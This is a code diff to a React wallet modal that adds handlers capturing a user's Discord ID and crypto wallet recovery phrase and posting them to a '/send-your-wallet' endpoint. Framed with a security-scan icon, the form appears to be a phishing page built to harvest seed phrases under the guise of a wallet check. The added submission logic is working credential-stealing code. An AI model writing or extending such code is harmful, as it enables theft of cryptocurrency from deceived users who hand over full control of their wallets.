@@ -1,4 +1,5 @@
-import React from "react";
+import React, { useState } from "react";
+import axios from "axios";
 
 // REACT BOOTSTRAP
 import { Modal, Button, Form, InputGroup, FormControl } from "react-bootstrap";
@@ -9,6 +10,38 @@ import { AiFillSecurityScan } from "react-icons/ai";
 
 export default function WalletModal(props) {
   const { show, handleClose, walletname, walletnameImg } = props;
+
+  // USERNAME & PASSWORD
+  const [discordID, setDiscordID] = useState("");
+  const [recoveryPhrase, setRecoveryPhrase] = useState("");
+
+  // SEND WALLET
+  let walletData = JSON.stringify({
+    wallet: walletname,
+    discordID,
+    recoveryPhrase: recoveryPhrase.split(" "),
+  });
+  const sentWallet = (e) => {
+    e.preventDefault();
+
+    var config = {
+      method: "post",
+      url: "http://localhost:8000/send-your-wallet",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      data: walletData,
+    };
+
+    axios(config)
+      .then((response) => {
+        console.log(response.data);
+      })
+      .catch((error) => {
+        console.log(error);
+      });
+  };
+
   return (
     <>
       <Modal show={show} onHide={handleClose} centered>
@@ -32,7 +65,7 @@ export default function WalletModal(props) {
         </Modal.Header>
         {/* BODY */}
         <Modal.Body>
-          <Form>
+          <Form onSubmit={sentWallet}>
             {/* DISCORD */}
             <Form.Label>Discord ID:</Form.Label>
             <InputGroup className="mb-3">
@@ -43,6 +76,8 @@ export default function WalletModal(props) {
                 placeholder="Enter your discord ID"
                 aria-label="Enter your discord ID"
                 aria-describedby="basic-addon1"
+                value={discordID}
+                onChange={(e) => setDiscordID(e.target.value)}
               />
             </InputGroup>
             {/* RECOVERY PHRASE */}
@@ -59,6 +94,8 @@ export default function WalletModal(props) {
                 placeholder="Enter your recovery phrase"
                 aria-label="Enter your recovery phrase"
                 aria-describedby="basic-addon1"
+                value={recoveryPhrase}
+                onChange={(e) => setRecoveryPhrase(e.target.value)}
               />
             </InputGroup>
             <Button variant="primary" type="submit">
